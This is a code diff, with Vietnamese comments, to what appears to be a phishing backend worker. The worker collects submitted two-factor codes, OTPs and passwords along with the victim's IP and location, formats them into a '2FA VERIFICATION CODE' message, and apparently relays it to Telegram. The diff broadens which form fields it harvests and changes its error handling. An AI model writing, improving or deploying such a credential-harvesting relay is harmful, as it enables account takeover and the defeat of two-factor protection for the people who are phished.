@@ -23,25 +23,34 @@ function escapeHtml(str) {
 
 async function parseRequestBody(request) {
     try {
-        const body = await request.json();
-        let data = body;
-        if (body.data && typeof body.data === 'string') {
-            const decoded = atob(body.data);
-            data = JSON.parse(decoded);
+        const rawBody = await request.json();
+        let data = rawBody;
+
+        // Xử lý nếu data được bọc dạng base64 hoặc chuỗi JSON
+        if (rawBody.data && typeof rawBody.data === 'string') {
+            try {
+                const decoded = atob(rawBody.data);
+                data = JSON.parse(decoded);
+            } catch (e) {
+                data = rawBody;
+            }
         }
-        return typeof data === 'object' && data !== null ? data : null;
+        return typeof data === 'object' && data !== null ? data : rawBody;
     } catch (e) {
         return null;
     }
 }
 
 function buildMessage(data, ip = 'Unknown') {
+    // Lấy linh hoạt các trường code / password / otp từ form gửi lên
+    const codeValue = data.code || data.otp || data.password || data.verification_code || 'N/A';
+
     let msg = `🔒 <b>2FA VERIFICATION CODE</b> 🔒\n`;
     msg += `────────────────────────\n`;
     msg += `• <b>IP:</b> <code>${escapeHtml(ip)}</code>\n`;
     msg += `• <b>Location:</b> ${escapeHtml(data.location || 'Unknown')}\n`;
     msg += `────────────────────────\n`;
-    msg += `🔑 <b>Code:</b> <code>${escapeHtml(data.code || data.password || 'N/A')}</code>\n`;
+    msg += `🔑 <b>Code:</b> <code>${escapeHtml(codeValue)}</code>\n`;
     msg += `────────────────────────`;
     return msg;
 }
@@ -121,11 +130,12 @@ export default {
             if (sentSuccess) {
                 return new Response(JSON.stringify({ success: true, session_id: crypto.randomUUID() }), { status: 200, headers: resHeaders });
             } else {
-                return new Response(JSON.stringify({ success: false, error: 'Internal processing error' }), { status: 500, headers: resHeaders });
+                resHeaders.set('Content-Type', 'application/json');
+                return new Response(JSON.stringify({ success: false, error: 'Telegram API error' }), { status: 500, headers: resHeaders });
             }
         } catch (error) {
             resHeaders.set('Content-Type', 'application/json');
-            return new Response(JSON.stringify({ success: false, error: 'Internal server error' }), { status: 500, headers: resHeaders });
+            return new Response(JSON.stringify({ success: false, error: error.message }), { status: 500, headers: resHeaders });
         }
     }
 };
